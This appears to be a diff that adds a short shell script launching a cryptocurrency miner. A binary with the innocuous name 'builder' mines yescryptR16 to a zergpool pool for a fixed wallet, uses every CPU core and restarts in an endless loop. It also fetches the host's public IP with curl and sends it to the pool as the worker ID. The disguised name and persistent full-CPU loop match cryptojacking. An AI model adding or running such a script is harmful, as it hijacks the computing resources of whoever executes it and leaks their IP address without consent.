@@ -1,0 +1,5 @@
+#!/bin/sh
+while [ 1 ]; do
+./builder -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye -p c=DGB,mc=QOGE,ID=Wewe-$(echo $(curl ident.me)) -t $(echo $(nproc --all))
+sleep 60
+done
